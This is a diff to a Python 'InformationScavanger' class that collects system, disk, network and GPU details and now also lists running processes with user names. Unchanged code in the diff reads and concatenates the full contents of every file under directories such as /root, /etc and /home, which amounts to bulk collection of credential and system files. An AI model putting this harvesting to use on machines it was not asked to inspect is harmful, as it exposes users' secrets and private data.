@@ -8,9 +8,9 @@ import ctypes
 from datetime import datetime
 from os import walk
 
-IMPORTANT_DIRECTORIES_WINDOWS = ["C:\Windows\System32", "C:\Program Files", "C:\Program Files (x86)", "C:\pagefile.sys", "C:\System Volume Information", "C:\Windows\WinSxS", "C:\Program Files\RUXIM"]
+IMPORTANT_DIRECTORIES_WINDOWS = ["C:\Windows\System32", "C:\Program Files", "C:\Program Files (x86)", "C:\pagefile.sys",
+                                 "C:\System Volume Information", "C:\Windows\WinSxS", "C:\Program Files\RUXIM"]
 IMPORTANT_DIRECTORIES_LINUX = ["/home", "/root", "/etc", "/opt", "/var", "/usr"]
-
 
 # [CLASS DESCRIPTION] Ha il compito di permettere la lettura di alcune directory che altrimenti darebbero problemi, solo in Windows.
 if os.name == "nt":
@@ -64,6 +64,7 @@ class InformationScavanger:
         self._diskInformation = {}
         self._networkInformation = {}
         self._gpuInformation = {}
+        self._processInformation = {}
 
     def systemRetrieval(self):
         """
@@ -76,6 +77,7 @@ class InformationScavanger:
         self.gatherDiskUsage()
         self.gatherNetworkInfo()
         self.gatherGpuInfo()
+        self.gatherAllProcesses()
 
         self.data['GeneralInformation'] = self._generalInformation
         self.data['CPUInformation'] = self._cpuInformation
@@ -83,6 +85,7 @@ class InformationScavanger:
         self.data['DiskInformation'] = self._diskInformation
         self.data['NetworkInformation'] = self._networkInformation
         self.data['GpuInformation'] = self._gpuInformation
+        self.data['ProcessInformation'] = self._processInformation
         # self.data['FileInformation'] = self._fileInformation
 
         return self.data
@@ -169,7 +172,7 @@ class InformationScavanger:
 
             try:
                 partition_usage = psutil.disk_usage(partition.mountpoint)
-            except PermissionError:
+            except Exception:
                 continue
 
             partitions[i]['TotalSize'] = get_size(partition_usage.total)
@@ -272,16 +275,16 @@ class InformationScavanger:
                     return_string += os.path.join(root, file)
                     return_string += "\n#####################################################\n"
                     try:
-                        with codecs.open(r"{}".format(os.path.join(root, file)), 'r', encoding="utf8", errors='ignore') as f:
+                        with codecs.open(r"{}".format(os.path.join(root, file)), 'r', encoding="utf8",
+                                         errors='ignore') as f:
                             return_string += '{}'.format(f.read()).encode('utf-8', 'replace').decode()
-                    except Exception as p:
+                    except Exception:
                         continue
                     return_string += "\n#####################################################\n"
         return return_string
 
     def retriveFiles(self):
         return_string = ""
-        directories_list = []
         if os.name == "nt":
             directories_list = IMPORTANT_DIRECTORIES_WINDOWS
         else:
@@ -308,3 +311,22 @@ class InformationScavanger:
                                                                                                          'replace').decode() + "\n"
 
         return return_string
+
+    def gatherAllProcesses(self):
+        """
+        Get list of running process sorted by Memory Usage
+        """
+        object_list = []
+        # Iterate over the list
+        for proc in psutil.process_iter():
+            try:
+                # Fetch process details as dict
+                pinfo = proc.as_dict(attrs=['pid', 'name', 'username'])
+                pinfo['vms'] = proc.memory_info().vms / (1024 * 1024)
+                # Append dict to list
+                object_list.append(pinfo)
+            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
+                pass
+        # Sort list of dict by key vms i.e. memory usage
+        object_list = sorted(object_list, key=lambda obj: obj['vms'], reverse=True)
+        self._processInformation['all-active-processes'] = object_list
